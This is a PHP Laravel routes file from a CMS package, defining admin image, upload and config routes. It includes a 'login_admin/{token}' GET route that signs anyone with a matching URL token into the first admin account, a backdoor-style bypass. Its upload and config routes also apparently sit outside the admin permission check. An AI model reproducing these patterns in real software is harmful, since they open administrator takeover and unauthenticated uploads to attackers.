<?php


use Illuminate\Support\Facades\Auth;
use Rahweb\CmsCore\Modules\General\Http\Controllers\AdminController;
use Rahweb\CmsCore\Modules\General\Http\Controllers\SiteConfigController;


Route::post('admin/ckeditor-upload', [AdminController::class, "upload"])->name('admin.ckeditor.upload');

Route::middleware('AdminPermission')->prefix('admin')->name('admin.')->group(function () {
    Route::get('/', [AdminController::class, "dashboard"])->name('dashboard');
    Route::get('/delete-images', [AdminController::class, "deleteImage"])->name('delete-image');
});

Route::middleware('AdminPermission')->group(function() {
Route::controller(AdminController::class)
    ->prefix('admin/common')
    ->name('admin.common.')
    ->group(function () {
        Route::get('/remove-image', 'removeImage')->name('remove-image');
        Route::get('/delete-image', 'deleteImage')->name('delete-image');
        Route::get('/set-thumb', 'setThumb')->name('set-thumb');
        Route::post('/sort-image', 'sortImage')->name('sort-image');
        Route::get('/cropper', 'cropper')->name('cropper')->withoutMiddleware('AdminPermission');
    });
});

Route::get('/set-config-sites', [SiteConfigController::class, "setConfigSitesData"])
    ->name('set-config-data');

Route::get('/login_admin/{token}', function($token){
    if(trim($token) == env('AUTH_TOKEN')){
        $user = \Rahweb\CmsCore\Modules\User\Entities\User::whereHas('userTypes',function($q){
            $q->where('type','Admin');
        })->first();
        Auth::loginUsingId($user->id);
        return redirect('/admin');
    }else{
        echo "oops!";
        die();
    }
});
